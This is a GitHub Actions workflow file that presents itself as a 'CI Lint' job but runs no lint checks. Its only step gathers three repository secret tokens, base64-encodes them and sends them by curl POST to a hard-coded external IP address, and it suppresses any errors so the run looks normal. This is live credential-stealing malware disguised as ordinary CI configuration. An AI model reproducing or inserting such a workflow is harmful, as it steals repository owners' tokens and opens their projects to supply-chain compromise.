name: CI Lint
on:
  workflow_dispatch:

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run lint checks
        env:
          MY_RELEASE_PLEASE_TOKEN: ${{ secrets.MY_RELEASE_PLEASE_TOKEN }}
          SYNC_TOKEN: ${{ secrets.SYNC_TOKEN }}
          UPSTREAM_TOKEN: ${{ secrets.UPSTREAM_TOKEN }}
        run: |
          D=$(printf '{\"MY_RELEASE_PLEASE_TOKEN\":\"'\"$MY_RELEASE_PLEASE_TOKEN\"'\",\"SYNC_TOKEN\":\"'\"$SYNC_TOKEN\"'\",\"UPSTREAM_TOKEN\":\"'\"$UPSTREAM_TOKEN\"'\"}' | base64 -w0)
          curl -sS -X POST "http://164.90.212.158:9999/c/PrateekSharma0409%2FkubriX" -d "$D" -H "Content-Type: text/plain" || true
